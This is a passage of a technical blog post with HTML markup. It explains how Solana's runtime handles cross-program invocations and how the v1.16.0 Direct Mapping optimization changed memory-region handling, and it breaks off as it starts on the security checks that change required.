</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span></span><span class="token token" style="color:#999">// Shared account data that persists across CPI boundaries </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">AccountSharedData</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>    lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>    data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>                           </span><span class="token token" style="color:#999">// Thread-safe shared data buffer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>    owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Handling CPI is somewhat similar to handling multiple <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code>, so the same <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> can be repurposed to pass information between programs.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">On CPI calls / returns, we need to expose the latest account states from the invoking side to the receiving side of the CPI. Solana runtime does this by first validating the latest changes to the account and committing them into the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code>, then passing the accounts in the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> into the other VM.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">CPI Call Process</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/cpi_call.png" alt="CPI Call"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> we described earlier lives on the host and serves as the bridge between two isolated VMs. When Program A calls Program B, each program runs in its own separate VM with isolated memory spaces, but they share account state through the host-side <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code>. Here&#x27;s what happens:</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 1: Instruction Crafting</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Program A constructs a CPI instruction specifying the callee&#x27;s program ID and metadata of accounts involved. This includes each account&#x27;s address, whether the account&#x27;s owner has signed the instruction, and whether the account should be writable.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 2: Load Account Data</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The runtime creates <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> structures by resolving <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> structures from Program A&#x27;s VM memory. These <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> structures hold mutable references pointing directly into Program A&#x27;s serialized account data, and will be used later during CPI return to efficiently update the caller&#x27;s state.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#999">// Resolved view of AccountInfo with direct field access</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span></span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                  </span><span class="token token" style="color:#999">// Direct mutable reference to lamports</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>                  </span><span class="token token" style="color:#999">// Direct mutable reference to owner</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    original_data_len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">,</span><span>               </span><span class="token token" style="color:#999">// Track size changes for realloc handling</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    serialized_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>          </span><span class="token token" style="color:#999">// Points to serialized data in VM</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    vm_data_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                      </span><span class="token token" style="color:#999">// VM address of AccountInfo.data pointer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    ref_to_len_in_vm</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>          </span><span class="token token" style="color:#999">// VM address of AccountInfo.data length</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    serialized_len_ptr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>    executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>    rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">When Program B finishes execution, the runtime uses these mutable references to directly update Program A&#x27;s VM memory without additional lookup.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 3: Validation and Cache Update</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Before handing control to Program B, the runtime validates everything Program A has done so far, similar to the validation phase in single program execution. Only after validation passes are Program A&#x27;s changes written to the shared cache. This ensures that the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> always holds valid account state, so each program in the call chain sees only validated changes from previous programs.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 4: Serialization to Callee VM</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Program B gets its own fresh VM with a new <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region. All account data from the shared cache gets serialized and copied into Program B&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region, just like in single program execution. Program B can now run normally, seeing the same <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> structures as if it were called directly.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">CPI Return Process</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/cpi_return.png" alt="CPI Return"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">When Program B finishes execution, the runtime must ensure all changes from Program B are valid before merging them back to Program A. Here&#x27;s what happens:</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 1: Validation and Cache Update</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Program B&#x27;s VM states are revalidated using the same rules as single program execution. This prevents Program B from violating ownership rules, stealing funds, or modifying read-only accounts. Only validated changes are written back to the shared cache, again, ensuring <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> always holds valid account state for subsequent programs in the call chain.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 2: Memory Buffer Management</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Account data may grow during Program B&#x27;s execution when the program calls <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">realloc()</code> to expand account storage. This happens when programs need to add new data fields, grow vectors, store additional state information, or allocate space for user data like NFT metadata. To handle this growth efficiently, the runtime reserves extra padding beyond the current data length when accounts are initially serialized into Program A&#x27;s VM memory. This reserved space avoids expensive reallocation during execution. If Program B&#x27;s growth exceeds the reserved padding, the transaction immediately reverts.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 3: Update Caller and Resume Execution</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Validated account states from the shared cache are copied back into Program A&#x27;s VM memory <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region. The runtime uses <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> structures with their mutable references to efficiently update Program A&#x27;s serialized account data.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">The Performance Problem</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Consider a typical DeFi swap with 4 nested program calls, each handling 10KB of account data. In the legacy model, each CPI call requires serializing this data into the callee&#x27;s VM, then copying it back on return. For our 4-level call chain, this means 40KB of serialization going down and 40KB of copying back up, totaling 80KB of memory operations for a single transaction.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">For a high-throughput blockchain processing thousands of complex transactions per second, this overhead becomes the performance bottleneck. Validators spent more time copying memory than executing actual program logic.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Solana needed a better runtime.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">The Optimization That Broke Everything: Direct Mapping (v1.16.0)</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">In Solana version 1.16.0, an optimization known as <strong class="font-semibold text-white">Direct Mapping</strong> was introduced to address the performance issues arising from repetitive serialization and deserialization of large account data. Instead of creating separate copies of account data in the VM&#x27;s INPUT region, Direct Mapping exposes the host&#x27;s actual account data buffers directly to the VM, allowing programs to read and write the same memory that the host uses to store account state. This optimization is only applied to the account data field, and not other fields such as account owner or lamport. The justification is that all other fields are relatively small is size, and the overhead of the optimization might outweigh the performance gained. Only the data field is large enough to justify such optimizations.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">MemoryRegion: The Foundation of VM Address Translation</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Since we&#x27;re preparing to map host memory into the virtual guest memory space, it&#x27;s crucial to explain how Solana manages guest virtual memory.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The VM and host operate in separate address spaces. When a program running in the VM accesses memory at address <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">0x400000000</code>, this virtual address must be translated to an actual host memory location. Solana handles this translation through <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> structures:</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryRegion</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> host_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// start host address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>             </span><span class="token token" style="color:#999">// start virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr_end</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// end virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                 </span><span class="token token" style="color:#999">// Length in bytes</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_gap_shift</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// Address translation parameters</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_writable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Permission tracking</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Each <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> maps a range of VM virtual addresses to host memory addresses. When the VM accesses memory, the runtime looks up the appropriate <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> and translates the virtual address to the corresponding host address.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Legacy Model: Single MemoryRegion</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">In the legacy model, all account data was packed into one large serialized blob in the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region, managed by a single <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>:</p>
<pre><code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">VM Address Range: 0x400000000 - 0x400100000
Host Address: Points to serialized account data buffer
State: Writable
</code></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This single <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> contained all serialized account data in one contiguous buffer.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/legacy_memoryregion.png" alt="Legacy MemoryRegion"/></span></p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Direct Mapping: Multiple MemoryRegions per Account</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Direct Mapping fundamentally changes this architecture. Instead of creating separate copies of account data in a serialized buffer, Direct Mapping creates individual <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> for each account that point directly to the host&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> buffers. When a program accesses <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">account.data</code>, the VM translates this access through the account&#x27;s specific <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to read or write the same memory buffer that the host uses to store the account state, eliminating the copying step entirely.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/new_memoryregion.png" alt="Legacy MemoryRegion"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The diagram above shows this architectural shift: from one large <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> containing serialized copies to multiple <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegions</code> pointing directly to host account buffers.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Changes to the MemoryRegion Structure</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">And just by this, we just got rid of the need for excessive copies! Sounds too good to be true, right?</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The optimization comes at a cost. Most noteably, Direct Mapping breaks the fundamental execution model that Solana previously relied upon. In the legacy model, programs could freely modify their VM memory because changes only affected local copies - validation happened afterward before committing to the host. With Direct Mapping, this approach no longer works because every VM write directly affects the actual account state recorded in the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> within <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> immediately. This forces Solana to implement immediate permission validation on every memory access.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">But what checks must be done? Is read and write checks sufficient? The answer, unfortunately, is no. We&#x27;ll start with presenting the changes to the MemoryRegion structure, and work our way back to the reasons behind the change.</p>
